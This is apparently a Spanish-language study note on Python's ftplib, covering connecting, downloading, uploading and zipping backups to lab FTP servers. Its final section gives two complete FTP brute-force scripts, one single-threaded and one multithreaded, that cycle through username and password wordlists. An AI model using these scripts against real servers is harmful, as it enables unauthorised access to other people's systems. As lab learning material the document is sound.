Con esta librería podemos conectarnos por FTP con Python. Por ejemplo para una conexión simple lo haríamos de esta forma:
```python
from ftplib import FTP

# Intenta conectarse al servidor FTP
try:
    ftp = FTP('192.168.0.28')
    ftp.login(user='kali', passwd='pinguinasio')
    print("Conexión exitosa")
except Exception as e:
    print(f"Error en la conexión: {e}")
```
Y vemos que la conexión fue exitosa:
![[Pasted image 20230417134751.png]]
## DESCARGAR UN ARCHIVO FTP PYTHON
Para descargar un archivo desde el servidor FTP utilizando python lo haremos así:
```python
from ftplib import FTP

ftp = FTP('192.168.0.18')
ftp.login(user='mario', passwd='123123')

ftp.cwd('/home/mario/Escritorio')

# Descargar un archivo
with open('numeros.sh', 'wb') as f:
    ftp.retrbinary('RETR numeros.sh', f.write)

ftp.quit()
```
Y se descarga:
![[Pasted image 20230417135116.png]]
## ENVIAR UN ARCHIVO POR FTP
Primero en vsftpd tenemos que activar el write enable:
![[Pasted image 20240531165948.png]]
Y este sería el código:
```python
from ftplib import FTP

# Intenta conectarse al servidor FTP
try:
    ftp = FTP('192.168.0.28')
    ftp.login(user='kali', passwd='pinguinasio')
    print("Conexión exitosa")
    
    # Abre el archivo en modo binario
    with open('nota.txt', 'rb') as file:
        # Envía el archivo al servidor FTP
        ftp.storbinary('STOR nota.txt', file)
        print("Archivo enviado con éxito")

except Exception as e:
    print(f"Error en la conexión o envío de archivo: {e}")
finally:
    ftp.quit()
```
Y vemos que el archivo se envió:
![[Pasted image 20240531170031.png]]
Ahora vamos a automatizar una copia de seguridad y que la envíe automáticamente al servidor:
```python
import os
import zipfile
from ftplib import FTP

# Nombre del archivo zip
zip_filename = 'scripts.zip'
extensiones_scripts = ('.sh', '.py')

# Crea un archivo zip y agrega archivos .sh y .py
with zipfile.ZipFile(zip_filename, 'w') as zipf:
    for archivo in os.listdir():
        if archivo.endswith(extensiones_scripts):
            zipf.write(archivo)

# Intenta conectarse al servidor FTP y enviar el archivo zip
try:
    ftp = FTP('192.168.0.28')
    ftp.login(user='kali', passwd='pinguinasio')
    print("Conexión exitosa")
    
    # Abre el archivo zip en modo binario
    with open(zip_filename, 'rb') as file:
        # Envía el archivo zip al servidor FTP
        ftp.storbinary(f'STOR {zip_filename}', file)
        print("Archivo zip enviado con éxito")

except Exception as e:
    print(f"Error en la conexión o envío de archivo: {e}")
finally:
    ftp.quit()
```
Lo ejecutamos y funciona:
![[Pasted image 20240531170732.png]]
### FUERZA BRUTA FTP CON PYTHON
```python
from ftplib import FTP

# Dirección del servidor FTP
ftp_server = '192.168.0.25'

# Archivos de usuarios y contraseñas
user_file = 'usuarios.txt'
password_file = 'contraseñas.txt'

with open(user_file, 'r') as uf:
    usernames = uf.read().splitlines()

with open(password_file, 'r') as pf:
    passwords = pf.read().splitlines()

for username in usernames:
    for password in passwords:
        try:
            ftp = FTP(ftp_server)
            ftp.login(user=username, passwd=password)
            print(f"Conexión exitosa con usuario: {username} y contraseña: {password}")
            ftp.quit()
            print(f"Credenciales válidas encontradas: {username}:{password}")
            exit()
        except Exception as e:
            print(f"Fallo con usuario: {username} y contraseña: {password}")
            try:
                ftp.quit()
            except:
                pass

print("Ataque de fuerza bruta terminado. No se encontraron credenciales válidas.")
```
Aunque podemos hacer que este ataque sea mucho más rápido:
```python
import threading
from ftplib import FTP

ftp_server = '192.168.0.25'
user_file = 'usuarios.txt'
password_file = 'contraseñas.txt'
num_threads = 20

# Leer los archivos de usuarios y contraseñas
with open(user_file, 'r') as uf:
    usernames = uf.read().splitlines()

with open(password_file, 'r') as pf:
    passwords = pf.read().splitlines()

# Crear una lista vacía para las combinaciones
combinations = []
for username in usernames:
    for password in passwords:
        combinations.append((username, password))

# Variable global para guardar credenciales válidas si se encuentran
found_credentials = None

# Función que intenta iniciar sesión con un par de credenciales
def try_login(username, password):
    global found_credentials
    if found_credentials:
        return

    try:
        ftp = FTP(ftp_server)
        ftp.login(user=username, passwd=password)
        found_credentials = (username, password)
        print(f"Conexión exitosa con usuario: {username} y contraseña: {password}")
        ftp.quit()
    except Exception:
        print(f"Fallo con usuario: {username} y contraseña: {password}")
    finally:
        try:
            ftp.quit()
        except:
            pass

# Lista para almacenar los hilos
threads = []

# Crear y iniciar los hilos
for username, password in combinations:
    if found_credentials:
        break

    thread = threading.Thread(target=try_login, args=(username, password))
    thread.start()
    threads.append(thread)

    # Limitar el número de hilos activos
    if len(threads) >= num_threads:
        for t in threads:
            t.join()
            if found_credentials:
                break
        threads = []

# Esperar a que todos los hilos terminen
for t in threads:
    t.join()
    if found_credentials:
        break

# Mostrar el resultado final
if not found_credentials:
    print("Ataque de fuerza bruta terminado. No se encontraron credenciales válidas.")
else:
    username, password = found_credentials
    print(f"Credenciales válidas encontradas: {username}:{password}")
```